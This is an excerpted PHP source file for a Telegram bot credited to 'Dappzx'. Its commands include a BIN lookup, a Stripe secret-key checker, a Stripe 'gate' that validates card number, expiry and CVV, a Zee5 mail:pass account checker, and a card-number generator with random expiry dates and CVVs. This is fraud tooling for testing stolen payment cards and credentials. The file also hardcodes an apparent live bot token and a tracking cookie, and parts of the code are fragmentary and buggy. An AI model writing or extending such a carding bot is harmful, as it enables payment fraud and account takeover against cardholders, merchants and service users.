...
$botToken = "2096995862:AAFGdJoQ7y8C7dg-jvFVhAWxqov-2CG8jUw"; # ENTER HERE BOT TOKEN
...
$mainid = (array("1281466433,1281466433")); #PUT HERE USERID
...
function checkId($userId){
    $mainids = array("1281466433,1281466433"); #PUT HERE Premium USERID
    if($userId == "1281466433"){#Add Here Your Id if ur owner
        $show = "Owner";
        }
...
sendMessage($chatId, "<i>Hello $firstname now you can use /cmds%0A%0ABot Made by Dappzx </i>");
}
#----------- [ COMMANDS ] --------#
elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<i>BIN: /bin 461046%0AINFO: /info Know Yourself%0ASK CHECK: /sk sk_xyz%0ASTRIPE GATE: /chk cc|mon|yy|cvv%0AZee5 Checker: /zee5 mail:pass%0A%0AGEN: /gen xxxxxx|xx|xx|xxx%0A%0ABot Made by Dappzx </i>");
}
#------------[User Info]---------#
elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<i>YOUR ID: <code>$userId</code>%0AFirst Name: $firstname%0AUsername: @$username%0A%0ABot Made by Dappzx </i>");
}
#---------------[BIN CODE]------------------#
...
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://password-gen.ga/bininfo.php?bin='.$cc.')');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: password-gen.ga',
        'Cookie: __gads=ID=302b3b9feab5f3e8-22c98c4ee9cc00f5:T=1635434361:RT=1635434361:S=ALNI_MbDUJCZJfsQqIiPHOw-bXBT07J_Vw',
    ...
    curl_close($ch);
    sendMessage($chatId, '<i>Bin Data ✓</i>%0A%0A<i>Bank: '.$bank.' </i>%0A<i>Country:</i><i> '.$name.''.$emoji.' </i>%0A<i>Brand: '.$brand.' </i>%0A<i>Card: '.$scheme.' </i>%0A<i>Type: '.$type.' </i>%0A<i>Currency: '.$currency.' </i>%0A<i>Checked By: @'.$username.' </i>%0A%0A<i>BOT MADE BY </i><b>@Dappzx</b>');
}
curl_close($ch);

if ((strpos($message, "!gen") ===0)||(strpos($message, "/gen") ===0)||(strpos($message, ".gen") ===0)){
sendaction($chatId, typing);
$gen = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
...
$quantity = $amou;
	for($i = 0; $i < $quantity; $i ++){
			...
			if (strlen($mesdigit) == 1){
				$mesdigit = "0".$meshdigit;
			}

			  if($ano == 'xxxx' or $ano == 'xxx' or $ano == 'xx' or $ano == 'x'){
			  $anodigit = rand(2021,2029);
			  }
			  else if (empty($ano)){
			  $anodigit = rand(2021,2029);
			  }
			...
			$cards[]= ''.$ccgen.'|'.$mesigit.'|'.$anodigit.'|'.$cvvdigit.'';
			$cards[]= "\n";
		}
		$card = implode ($cards);
		if(empty($mes)){
...
•Format Used: $bin|$mes|$ano|$cvv

<code>$card</code>

••• Gen By: @$username
••• Bot By: <code>@Dappzx</code></b>");
		sendMessage($chatId, $message_id_1, $keyboard, $respo);
}
#---------------------------[ GATE 1 CHECKER ]-----------------------#
...
$fim = curl_exec($ch);
    ...
    $level = GetStr($fim, '"level":"', '"');
    $country = GetStr($fim, '"country":{"code":"', '"name"');
    $bank = GetStr($fim, '"bank":{"name:"', '":"website":"', '":"phone":"', '"}}');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
